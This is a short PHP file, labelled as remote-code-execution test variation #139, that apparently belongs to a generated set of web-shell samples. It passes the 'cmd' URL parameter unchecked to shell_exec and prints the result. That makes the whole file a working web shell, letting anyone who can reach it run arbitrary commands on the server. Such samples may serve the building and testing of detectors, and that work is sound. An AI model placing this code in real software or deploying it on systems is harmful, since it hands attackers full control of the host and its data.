<?php
// RCE test variation #139
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>